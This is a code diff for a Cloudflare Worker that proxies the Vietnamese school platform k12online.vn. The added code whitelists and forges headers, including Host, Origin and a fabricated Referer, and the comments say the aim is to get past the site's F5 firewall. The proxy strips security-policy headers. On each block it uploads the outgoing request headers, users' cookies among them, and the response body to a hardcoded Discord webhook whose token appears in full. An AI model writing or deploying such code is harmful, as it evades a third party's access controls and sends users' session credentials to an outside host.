@@ -4,7 +4,25 @@ export default {
     const baseDomain = 'k12online.vn';
     const proxyDomain = url.origin;
     
-    // 1. Kiểm tra Cookie
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1529847938031947806/rFcwxaFESQrhrtYbarMj0m3IlBhAhwmXQtHMYFHNa9I0lyFh6irDqDXmwqCe_XYYotCA";
+
+    async function sendDiscordLog(sentHeaders, responseStatus, responseHeaders, responseBody) {
+      try {
+        const logData = {
+          time: new Date().toISOString(),
+          targetUrl: request.url,
+          requestHeadersSent: sentHeaders,
+          responseStatus: responseStatus,
+          responseHeadersReceived: responseHeaders,
+          responseBody: responseBody
+        };
+        const formData = new FormData();
+        formData.append('file', new File([JSON.stringify(logData, null, 2)], `waf_block_log.json`, { type: 'application/json' }));
+        formData.append('content', '🚨 **WAF Tường Lửa đã chặn Request!**');
+        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+      } catch (err) {}
+    }
+
     let targetHost = baseDomain;
     const cookieHeader = request.headers.get('Cookie') || '';
     const match = cookieHeader.match(/tenant_host=([^;]+)/);
@@ -16,24 +34,39 @@ export default {
     const tenantPrefix = prefixMatch ? prefixMatch[0] : '';
 
     try {
-      // --- FIX LỖI TƯỜNG LỬA F5: TRẢ LẠI SỰ TỰ NHIÊN CHO TRÌNH DUYỆT ---
-      const modifiedHeaders = new Headers(request.headers);
+      // --- CHIẾN THUẬT MỚI: DANH SÁCH TRẮNG (WHITELIST HEADERS) ---
+      const modifiedHeaders = new Headers();
       
-      // Chỉ xóa các dấu vết CỦA CLOUDFLARE. Tuyệt đối không đụng vào User-Agent hay Sec-Fetch của trình duyệt thật nữa.
-      const headersToRemove = [
-        'cf-connecting-ip', 'cf-ipcountry', 'cf-ray', 'cf-visitor', 'cf-ew-via',
-        'x-forwarded-proto', 'x-forwarded-for', 'x-real-ip'
+      // Chỉ cho phép các Header tiêu chuẩn của trình duyệt đi qua
+      const allowedKeys = [
+        'accept', 'accept-language', 'user-agent', 'sec-ch-ua',
+        'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest',
+        'sec-fetch-mode', 'sec-fetch-site', 'sec-fetch-user', 'cookie',
+        'upgrade-insecure-requests', 'cache-control'
       ];
-      headersToRemove.forEach(h => modifiedHeaders.delete(h));
 
-      // Bắt buộc phải đổi Host thành của trang gốc
+      for (const [key, value] of request.headers.entries()) {
+        if (allowedKeys.includes(key.toLowerCase())) {
+          modifiedHeaders.set(key, value);
+        }
+      }
+
+      // Đóng giả Host, Origin, Referer tuyệt đối chuẩn xác
       modifiedHeaders.set('Host', targetHost); 
       
-      if (modifiedHeaders.has('origin')) modifiedHeaders.set('origin', targetDomain);
-      if (modifiedHeaders.has('referer')) {
-        const ref = modifiedHeaders.get('referer');
-        modifiedHeaders.set('referer', ref.replace(proxyDomain, targetDomain));
+      if (request.headers.has('origin')) {
+        modifiedHeaders.set('origin', targetDomain);
       }
+      if (request.headers.has('referer')) {
+        const ref = request.headers.get('referer');
+        // Sửa link referer từ dạng workers.dev thành dạng k12online.vn
+        modifiedHeaders.set('referer', ref.replace(proxyDomain, targetDomain));
+      } else {
+         // Nếu không có referer, tự tạo referer hợp lý để WAF tin tưởng
+         modifiedHeaders.set('referer', targetDomain + '/');
+      }
+
+      const sentHeadersLog = Object.fromEntries(modifiedHeaders.entries());
 
       const init = {
         method: request.method,
@@ -45,10 +78,9 @@ export default {
         init.body = request.body;
       }
 
-      // KẾT NỐI ĐẾN SERVER GỐC
       const response = await fetch(targetUrl, init);
-
       const responseHeaders = new Headers(response.headers);
+      
       const headersToDrop = [
         'content-encoding', 'content-length', 'transfer-encoding', 'connection',
         'content-security-policy', 'content-security-policy-report-only', 
@@ -63,7 +95,6 @@ export default {
         responseHeaders.delete('set-cookie');
       }
 
-      // 2. XỬ LÝ TEXT & BƠM MÃ CHỐNG CHUYỂN TAB
       const contentType = responseHeaders.get('content-type') || '';
       const isTextContent = contentType.includes('text/') || 
                             contentType.includes('application/json') || 
@@ -71,6 +102,12 @@ export default {
 
       if (isTextContent) {
         let text = await response.text();
+
+        // Kiểm tra xem có bị F5 chặn không
+        if (text.includes("The requested URL was rejected") || response.status === 403) {
+           const receivedHeadersLog = Object.fromEntries(response.headers.entries());
+           ctx.waitUntil(sendDiscordLog(sentHeadersLog, response.status, receivedHeadersLog, text));
+        }
 
         let foundTenant = null;
         const regexSub = new RegExp(`https:\\\\?/\\\\?/([a-zA-Z0-9-]+)\\.${baseDomain.replace(/\./g, '\\.')}`, 'g');
@@ -122,7 +159,6 @@ export default {
         return new Response(text, { status: response.status, headers: responseHeaders });
       } 
       
-      // XỬ LÝ REDIRECT VÀ FILE
       if (response.status >= 300 && response.status < 400) {
         const location = responseHeaders.get('location');
         if (location) {
